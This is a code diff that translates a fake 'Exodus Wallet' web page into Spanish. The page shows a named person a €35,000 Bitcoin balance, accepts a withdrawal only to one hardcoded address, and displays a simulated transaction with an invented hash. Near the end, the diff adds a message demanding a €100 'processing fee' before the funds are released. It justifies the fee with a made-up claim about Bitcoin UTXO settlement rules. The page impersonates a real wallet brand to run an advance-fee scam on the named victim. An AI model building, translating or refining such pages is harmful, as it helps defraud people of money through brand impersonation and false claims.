@@ -1,9 +1,9 @@
 <!doctype html>
-<html lang="en">
+<html lang="es">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Exodus Wallet</title>
+<title>Billetera Exodus</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <style>
   body { background:#0b1a2b; color:#fff; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
@@ -21,7 +21,7 @@
     <div class="flex items-center gap-2">
       <div class="h-9 w-9 rounded-full bg-[#0500ff] flex items-center justify-center font-bold text-sm">EX</div>
       <div>
-        <p class="text-xs text-slate-400 leading-tight">EXODUS WALLET</p>
+        <p class="text-xs text-slate-400 leading-tight">BILLETERA EXODUS</p>
         <p class="text-sm font-semibold leading-tight">Jose Maria Quinones Manzaneque</p>
       </div>
     </div>
@@ -29,22 +29,22 @@
   </header>
 
   <section class="px-5 pt-6 pb-2 text-center">
-    <p class="text-sm text-slate-400">Total Balance</p>
-    <h1 id="eur" class="mt-2 text-4xl font-bold tracking-tight">€35,000.00</h1>
+    <p class="text-sm text-slate-400">Saldo Total</p>
+    <h1 id="eur" class="mt-2 text-4xl font-bold tracking-tight">€35.000,00</h1>
     <div class="mt-2 inline-flex items-center gap-2 rounded-full bg-[#142844] px-3 py-1 text-xs">
       <span class="h-1.5 w-1.5 rounded-full bg-emerald-400"></span>
-      <span id="btc" class="font-medium text-slate-200">0.3500 BTC</span>
-      <span class="text-emerald-400">+2.41%</span>
+      <span id="btc" class="font-medium text-slate-200">0,3500 BTC</span>
+      <span class="text-emerald-400">+2,41%</span>
     </div>
   </section>
 
   <section class="mt-6 px-5">
-    <button onclick="openWithdraw()" class="w-full rounded-xl bg-[#0500ff] hover:bg-[#0500ff]/90 py-3.5 text-sm font-semibold">↑ Withdraw</button>
+    <button onclick="openWithdraw()" class="w-full rounded-xl bg-[#0500ff] hover:bg-[#0500ff]/90 py-3.5 text-sm font-semibold">↑ Retirar</button>
   </section>
 
   <div class="mx-5 mt-5 flex items-center justify-between rounded-xl bg-[#142844] px-4 py-3">
     <div>
-      <p class="text-xs text-slate-400">Wallet Address</p>
+      <p class="text-xs text-slate-400">Dirección de la Billetera</p>
       <p class="font-mono text-xs text-slate-200 truncate max-w-[260px]">bc1q03t8h5ssqc8c5wnsh4p7qa2u4jyvtm6n40fuv4</p>
     </div>
     <span class="text-slate-400">⧉</span>
@@ -52,8 +52,8 @@
 
   <div class="mt-6 px-5 flex items-center gap-6 border-b border-white/5">
     <button class="pb-3 text-sm font-semibold border-b-2 border-[#0500ff]">Tokens</button>
-    <button class="pb-3 text-sm text-slate-400">NFTs</button>
-    <button class="pb-3 text-sm text-slate-400">Activity</button>
+    <button class="pb-3 text-sm text-slate-400">NFT</button>
+    <button class="pb-3 text-sm text-slate-400">Actividad</button>
   </div>
 
   <section id="assets" class="px-3 mt-2 pb-32"></section>
@@ -69,8 +69,8 @@ const PRICE = 100000;
 const FEE = 100;
 const state = { btc: 0.35, sent: 0, address: "", note: "" };
 
-const fmtEur = n => n.toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2});
-const fmtBtc = n => n.toLocaleString("en-US",{minimumFractionDigits:4,maximumFractionDigits:4});
+const fmtEur = n => n.toLocaleString("es-ES",{minimumFractionDigits:2,maximumFractionDigits:2});
+const fmtBtc = n => n.toLocaleString("es-ES",{minimumFractionDigits:4,maximumFractionDigits:4});
 const shorten = a => !a ? "—" : a.length<=14 ? a : a.slice(0,8)+"…"+a.slice(-6);
 
 function renderBalance(){
@@ -80,11 +80,11 @@ function renderBalance(){
 }
 function renderAssets(){
   const rows = [
-    {s:"BTC",n:"Bitcoin",c:"Bitcoin",a:fmtBtc(state.btc)+" BTC",v:"€"+fmtEur(state.btc*PRICE),ch:"+2.41%",up:true,co:"#F7931A"},
-    {s:"ETH",n:"Ethereum",c:"ERC20",a:"0.0000 ETH",v:"€0.00",ch:"0.00%",co:"#627EEA"},
-    {s:"USDT",n:"Tether",c:"TRC20",a:"0.00 USDT",v:"€0.00",ch:"0.00%",co:"#26A17B"},
-    {s:"BNB",n:"BNB",c:"BEP20",a:"0.00 BNB",v:"€0.00",ch:"0.00%",co:"#F3BA2F"},
-    {s:"SOL",n:"Solana",c:"Solana",a:"0.00 SOL",v:"€0.00",ch:"0.00%",co:"#9945FF"},
+    {s:"BTC",n:"Bitcoin",c:"Bitcoin",a:fmtBtc(state.btc)+" BTC",v:"€"+fmtEur(state.btc*PRICE),ch:"+2,41%",up:true,co:"#F7931A"},
+    {s:"ETH",n:"Ethereum",c:"ERC20",a:"0,0000 ETH",v:"€0,00",ch:"0,00%",co:"#627EEA"},
+    {s:"USDT",n:"Tether",c:"TRC20",a:"0,00 USDT",v:"€0,00",ch:"0,00%",co:"#26A17B"},
+    {s:"BNB",n:"BNB",c:"BEP20",a:"0,00 BNB",v:"€0,00",ch:"0,00%",co:"#F3BA2F"},
+    {s:"SOL",n:"Solana",c:"Solana",a:"0,00 SOL",v:"€0,00",ch:"0,00%",co:"#9945FF"},
   ];
   document.getElementById("assets").innerHTML = rows.map(r=>`
     <div class="w-full flex items-center gap-3 px-3 py-3 rounded-xl hover:bg-white/5">
@@ -108,58 +108,58 @@ function openWithdraw(){ state.address=""; state.note=""; renderForm(""); }
 function renderForm(err){
   show(`
     <div class="p-6">
-      <div class="flex items-center justify-between"><h2 class="text-lg font-semibold">Withdraw Bitcoin</h2><button onclick="closeModal()" class="h-8 w-8 rounded-full bg-[#142844] text-slate-400">✕</button></div>
+      <div class="flex items-center justify-between"><h2 class="text-lg font-semibold">Retirar Bitcoin</h2><button onclick="closeModal()" class="h-8 w-8 rounded-full bg-[#142844] text-slate-400">✕</button></div>
       <div class="mt-5 space-y-4">
         <div>
-          <label class="text-xs font-medium text-slate-400 mb-1.5 block">Recipient BTC Address (EXODUS WALLET)</label>
+          <label class="text-xs font-medium text-slate-400 mb-1.5 block">Dirección BTC del Destinatario (BILLETERA EXODUS)</label>
           <input id="addr" value="${state.address}" placeholder="bc1q..." class="w-full bg-[#142844] rounded-xl px-4 py-3 text-sm font-mono placeholder:text-slate-500 outline-none focus:ring-2 focus:ring-[#0500ff]" />
           ${err?`<p class="mt-1.5 text-xs text-red-400">⚠ ${err}</p>`:""}
         </div>
         <div>
-          <label class="text-xs font-medium text-slate-400 mb-1.5 block">Amount</label>
+          <label class="text-xs font-medium text-slate-400 mb-1.5 block">Cantidad</label>
           <div class="flex items-center justify-between bg-[#142844] rounded-xl px-4 py-3">
             <div><p class="text-sm font-semibold">${fmtBtc(state.btc)} BTC</p><p class="text-xs text-slate-400">≈ €${fmtEur(state.btc*PRICE)}</p></div>
-            <span class="text-xs font-bold text-[#0500ff] bg-[#0500ff]/15 px-2.5 py-1 rounded-md">MAX</span>
+            <span class="text-xs font-bold text-[#0500ff] bg-[#0500ff]/15 px-2.5 py-1 rounded-md">MÁX</span>
           </div>
-          <p class="mt-1 text-xs text-slate-400">Sending full available balance.</p>
+          <p class="mt-1 text-xs text-slate-400">Enviando el saldo total disponible.</p>
         </div>
-        <div class="rounded-xl bg-[#142844] p-3 text-xs text-slate-400">🛡 Address is verified against your EXODUS WALLET. Bitcoin transactions cannot be reversed.</div>
-        <button onclick="verify()" class="w-full rounded-xl bg-[#0500ff] py-3.5 text-sm font-semibold">Verify Address</button>
+        <div class="rounded-xl bg-[#142844] p-3 text-xs text-slate-400">🛡 La dirección está verificada con tu BILLETERA EXODUS. Las transacciones de Bitcoin no se pueden revertir.</div>
+        <button onclick="verify()" class="w-full rounded-xl bg-[#0500ff] py-3.5 text-sm font-semibold">Verificar Dirección</button>
       </div>
     </div>`);
 }
 function verify(){
   const v = document.getElementById("addr").value.trim();
   state.address = v;
-  if(v !== REQUIRED){ renderForm("Address does not match the verified EXODUS WALLET recipient address."); return; }
+  if(v !== REQUIRED){ renderForm("La dirección no coincide con la dirección verificada del destinatario de la BILLETERA EXODUS."); return; }
   renderConfirm();
 }
 function row(l,v,mono,bold){ return `<div class="flex items-center justify-between"><span class="text-slate-400">${l}</span><span class="${bold?'font-bold text-base':'font-medium'} ${mono?'font-mono text-xs':''}">${v}</span></div>`; }
 function renderConfirm(){
   show(`
     <div class="p-6">
-      <div class="flex items-center justify-between"><h2 class="text-lg font-semibold">Confirm Withdrawal</h2><button onclick="closeModal()" class="h-8 w-8 rounded-full bg-[#142844] text-slate-400">✕</button></div>
+      <div class="flex items-center justify-between"><h2 class="text-lg font-semibold">Confirmar Retiro</h2><button onclick="closeModal()" class="h-8 w-8 rounded-full bg-[#142844] text-slate-400">✕</button></div>
       <div class="mt-5 space-y-3 text-sm">
-        ${row("Wallet","EXODUS WALLET")}
-        ${row("Asset","Bitcoin (BTC)")}
-        ${row("Network","Bitcoin Mainnet")}
-        ${row("To",shorten(state.address),true)}
-        ${row("Amount",fmtBtc(state.btc)+" BTC")}
-        ${row("Network Fee","€"+fmtEur(FEE))}
+        ${row("Billetera","BILLETERA EXODUS")}
+        ${row("Activo","Bitcoin (BTC)")}
+        ${row("Red","Bitcoin Mainnet")}
+        ${row("Para",shorten(state.address),true)}
+        ${row("Cantidad",fmtBtc(state.btc)+" BTC")}
+        ${row("Comisión de Red","€"+fmtEur(FEE))}
         <div class="h-px bg-white/10 my-1"></div>
         ${row("Total","€"+fmtEur(state.btc*PRICE),false,true)}
       </div>
       <div class="mt-6 grid grid-cols-2 gap-3">
-        <button onclick="renderForm('')" class="rounded-xl bg-[#142844] py-3 text-sm font-semibold">Back</button>
-        <button onclick="processSend()" class="rounded-xl bg-[#0500ff] py-3 text-sm font-semibold">Confirm & Send</button>
+        <button onclick="renderForm('')" class="rounded-xl bg-[#142844] py-3 text-sm font-semibold">Atrás</button>
+        <button onclick="processSend()" class="rounded-xl bg-[#0500ff] py-3 text-sm font-semibold">Confirmar y Enviar</button>
       </div>
     </div>`);
 }
 function processSend(){
   show(`<div class="p-10 flex flex-col items-center text-center">
     <div class="h-12 w-12 rounded-full border-4 border-[#3375BB] border-t-transparent spin"></div>
-    <h3 class="mt-5 text-lg font-semibold">Broadcasting transaction…</h3>
-    <p class="mt-2 text-sm text-slate-400">Securing your transfer on the Bitcoin network.</p>
+    <h3 class="mt-5 text-lg font-semibold">Transmitiendo transacción…</h3>
+    <p class="mt-2 text-sm text-slate-400">Asegurando tu transferencia en la red Bitcoin.</p>
   </div>`);
   setTimeout(()=>{ state.sent = state.btc; state.btc = 0; renderBalance(); renderSuccess(); },1800);
 }
@@ -170,21 +170,29 @@ function renderSuccess(){
         <div class="absolute inset-0 rounded-full bg-emerald-500/20 blur-2xl"></div>
         <div class="relative h-20 w-20 rounded-full bg-emerald-500/15 flex items-center justify-center text-emerald-400 text-4xl">✓</div>
       </div>
-      <h3 class="mt-6 text-2xl font-bold">Withdrawal Successful</h3>
-      <p class="mt-2 text-[11px] font-semibold tracking-[0.18em] text-[#6b8cff]">PAYMENT PROCESSED BY EXODUS WALLET</p>
+      <h3 class="mt-6 text-2xl font-bold">Retiro Exitoso</h3>
+      <p class="mt-2 text-[11px] font-semibold tracking-[0.18em] text-[#6b8cff]">PAGO PROCESADO POR BILLETERA EXODUS</p>
       <div class="mt-6 w-full rounded-xl bg-[#142844] p-4 text-sm space-y-3 text-left">
-        ${row("Amount",fmtBtc(state.sent)+" BTC",false,true)}
-        ${row("Value","€"+fmtEur(state.sent*PRICE))}
-        ${row("Network Fee","€"+fmtEur(FEE))}
-        ${row("To",shorten(REQUIRED),true)}
-        ${row("Tx Hash","0x8f3a…b27c",true)}
-        ${row("Status","<span class='text-emerald-400 font-semibold'>Confirmed</span>")}
+        ${row("Cantidad",fmtBtc(state.sent)+" BTC",false,true)}
+        ${row("Valor","€"+fmtEur(state.sent*PRICE))}
+        ${row("Comisión de Red","€"+fmtEur(FEE))}
+        ${row("Para",shorten(REQUIRED),true)}
+        ${row("Hash de Tx","0x8f3a…b27c",true)}
+        ${row("Estado","<span class='text-emerald-400 font-semibold'>Confirmado</span>")}
       </div>
       <div class="mt-4 w-full text-left">
-        <label class="text-xs font-medium text-slate-400 mb-1.5 block">Message / Note</label>
-        <textarea rows="3" placeholder="Add a note for your records (optional)" class="w-full bg-[#142844] rounded-xl px-4 py-3 text-sm placeholder:text-slate-500 outline-none focus:ring-2 focus:ring-[#0500ff] resize-none"></textarea>
+        <label class="text-xs font-medium text-slate-400 mb-1.5 block">Nota</label>
+        <textarea rows="3" placeholder="Tu retiro de 0,3500 BTC (€35.000,00) ha sido validado y está en cola para su transmisión en la red Bitcoin.
+
+Antes de que la transacción pueda confirmarse, se debe abonar una comisión única de procesamiento de red de €100,00. Esta comisión cubre los costes de confirmación de los mineros y la validación en cadena, y no puede deducirse del importe del retiro debido a las reglas de liquidación UTXO de Bitcoin.
+
+Estado: A la espera del pago de la comisión Referencia: EXODUS-WTH-8F3AB27C
+
+Una vez recibida la comisión, tu transacción se transmitirá de inmediato y normalmente se confirma en un plazo de 10 a 30 minutos. Tus fondos permanecen asegurados en tu BILLETERA EXODUS hasta que se complete la transferencia.
+
+" class="w-full bg-[#142844] rounded-xl px-4 py-3 text-sm placeholder:text-slate-500 outline-none focus:ring-2 focus:ring-[#0500ff] resize-none"></textarea>
       </div>
-      <button onclick="closeModal()" class="mt-6 w-full rounded-xl bg-[#0500ff] py-3.5 text-sm font-semibold">Done</button>
+      <button onclick="closeModal()" class="mt-6 w-full rounded-xl bg-[#0500ff] py-3.5 text-sm font-semibold">Hecho</button>
     </div>`);
 }
 </script>
